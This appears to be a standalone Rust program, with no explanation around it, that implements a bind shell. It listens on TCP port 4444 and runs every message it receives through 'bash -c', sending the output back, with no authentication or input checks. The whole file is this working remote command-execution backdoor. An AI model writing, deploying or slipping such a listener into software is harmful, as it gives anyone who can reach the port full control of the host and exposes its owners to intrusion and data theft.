use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::process::{Command, Stdio};
use std::thread;

fn main() {
    let listener = TcpListener::bind("127.0.0.1:4444").expect("Failed to bind");

    println!("Server listening on port 4444");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection: {}", stream.peer_addr().unwrap());
                thread::spawn(|| {
                    handle_client(stream);
                });
            }
            Err(e) => {
                eprintln!("Error accepting connection: {}", e);
            }
        }
    }
}

fn handle_client(mut stream: TcpStream) {
    let mut buffer = [0; 1024];
    loop {
        match stream.read(&mut buffer) {
            Ok(bytes_read) => {
                if bytes_read == 0 {
                    println!("Connection closed by client");
                    break;
                }
                let message = String::from_utf8_lossy(&buffer[..bytes_read]).to_string();
                let output = Command::new("bash")
                    .arg("-c")
                    .arg(message)
                    .stdout(Stdio::piped())
                    .output()
                    .expect("failed to execute process");
                stream.write_all(&output.stdout).expect("failed to write response to stream");
            }
            Err(e) => {
                eprintln!("Error reading from stream: {}", e);
                break;
            }
        }
    }
}